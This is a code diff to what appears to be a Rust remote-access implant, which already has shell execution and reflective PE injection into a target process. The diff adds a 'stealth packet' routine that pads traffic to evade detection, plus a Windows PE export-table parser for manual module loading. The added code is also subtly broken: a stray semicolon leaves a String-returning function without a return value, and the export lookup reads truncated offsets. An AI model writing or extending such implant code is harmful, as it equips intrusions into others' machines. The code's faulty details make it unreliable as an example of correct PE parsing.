@@ -304,6 +304,35 @@ fn execute_shell(cmd: &str) -> String {
     }
 }
 
+unsafe fn generate_random_padding() -> Vec<u8> {
+    let mut padding = Vec::with_capacity(320);
+    let seed = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_nanos() as u64;
+    
+    let padding_size = ((seed % 256) + 64) as usize;
+    
+    for i in 0..padding_size {
+        let byte = ((seed >> (i % 8)) as u8).wrapping_add(i as u8);
+        padding.push(byte);
+    }
+    
+    padding
+}
+
+fn create_stealth_packet(payload: &[u8]) -> Vec<u8> {
+    let mut packet = Vec::with_capacity(payload.len() + 384);
+    
+    packet.extend_from_slice(&(payload.len() as u32).to_le_bytes());
+    packet.extend_from_slice(payload);
+    
+    let padding = generate_random_padding();
+    packet.extend(padding);
+    
+    packet
+}
+
 fn execute_reflective_inject(args: &[String]) -> String {
     if args.len() < 2 {
         return "Usage: inject <pid> <base64_pe>".into();
@@ -317,5 +346,46 @@ fn execute_reflective_inject(args: &[String]) -> String {
             }
         }
     }
-    "Inject failed: invalid PE or load error".into()
+    "Inject failed: invalid PE or load error".into();
+}
+
+#[cfg(windows)]
+unsafe fn get_queued_export_address(module_base: u64) -> Option<usize> {
+    use crate::syscall::SyscallEntry;
+
+    let DOS_PTR = module_base as *const u8;
+    if *DOS_PTR.add(0) != b'M' || *DOS_PTR.add(1) != b'Z' {
+        return None;
+    }
+
+    let E_LFANEW = (*DOS_PTR.add(0x3C) as usize)
+        | (*DOS_PTR.add(0x3D) as usize) << 8
+        | (*DOS_PTR.add(0x3E) as usize) << 16
+        | (*DOS_PTR.add(0x3F) as usize) << 24;
+
+    let NT_HEADERS = (module_base + E_LFANEW as u64) as *const u8;
+    if *NT_HEADERS.add(0) != b'P' || *NT_HEADERS.add(1) != b'E' {
+        return None;
+    }
+
+    let EXPORT_DIR_RVA = (*NT_HEADERS.add(0x78) as u32)
+        | (*NT_HEADERS.add(0x79) as u32) << 8
+        | (*NT_HEADERS.add(0x7A) as u32) << 16
+        | (*NT_HEADERS.add(0x7B) as u32) << 24;
+
+    let EXPORT_DIR = (module_base + EXPORT_DIR_RVA as u64) as *const u8;
+    let NUM_EXPORTS = (*EXPORT_DIR.add(0x18) as u32)
+        | (*EXPORT_DIR.add(0x19) as u32) << 8
+        | (*EXPORT_DIR.add(0x1A) as u32) << 16
+        | (*EXPORT_DIR.add(0x1B) as u32) << 24;
+
+    if NUM_EXPORTS == 0 {
+        return None;
+    }
+
+    let EAT_RVA = (*EXPORT_DIR.add(0x20) as u32)
+        | (*EXPORT_DIR.add(0x21) as u32) << 8;
+
+    let func_rva = *(module_base as *const u32).add(EAT_RVA as usize / 4) as u32;
+    Some((module_base + func_rva as u64) as usize)
 }
